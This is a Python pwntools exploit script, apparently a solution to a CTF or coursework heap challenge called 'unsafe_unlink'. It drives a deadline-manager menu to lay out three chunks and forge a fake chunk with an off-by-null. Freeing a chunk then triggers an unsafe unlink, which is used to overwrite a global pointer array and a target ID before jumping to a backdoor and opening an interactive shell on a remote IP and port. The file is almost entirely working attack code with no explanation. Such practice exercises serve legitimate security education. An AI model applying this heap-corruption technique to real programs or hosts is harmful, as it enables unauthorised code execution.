from pwn import *

#context.log_level = 'DEBUG'

def add_ddl(time, content):
    p.recvuntil("Your chocie:\n")
    p.sendline("1")
    p.recvuntil("input the ddl time")
    p.sendline(time)
    p.recvuntil("input the ddl content")
    p.sendline(content)
    p.recvuntil("done")

def free_ddl(index):
    p.recvuntil("Your chocie:\n")
    p.sendline("2")
    p.recvuntil("input the ddl index")
    p.sendline(index)
    p.recvuntil("done")

def edit_ddl(index, time, content):
    p.recvuntil("Your chocie:\n")
    p.sendline("4")
    p.recvuntil("input the ddl index")
    p.sendline(index)
    p.recvuntil("input the new ddl time")
    p.sendline(time)
    p.recvuntil("input the new ddl content")
    p.sendline(content)
    p.recvuntil("done")

def check():
    p.recvuntil("Your chocie:\n")
    p.sendline("6")
    


local = 0
fake_chunk_size = 0x5f0
array_addr = 0x6020e0
targetID_addr = 0x6020c0
fake_chunk_fd = array_addr - (3 * 8)
fake_chunk_bk = array_addr - (2 * 8)

if local:
    p = process('./unsafe_unlink', env = {'LD_LIBRARY_PATH': '.'})
else:
    p = remote("47.99.80.189", 10031)
    libc = ELF('libc-2.27.so')
    p.recvuntil("ID:")
    p.sendline("3180103650")

#raw_input()

# 1. set heap layout: A->B->C
add_ddl("AAAA", "AAAA")
add_ddl("BBBB", "BBBB")
add_ddl("CCCC", "CCCC")

# 2. off-by-null:
edit_ddl("1", p64(0x0) + p64(fake_chunk_size) + p64(fake_chunk_fd) + "\xd0\x20\x60", "\x00" * 0x5d0 + p64(fake_chunk_size))  

# 3. free B -> unlink
free_ddl("2")

# 4. write targetID
#edit_ddl("1", p64(0) * 3 + p64(targetID_addr), "\x00")
edit_ddl("1", p64(0) * 3 + "\xc0\x20\x60", "\x00")

edit_ddl("1", p64(3180103650), "\x00")

# 5. jump to backdoor
check()

p.interactive()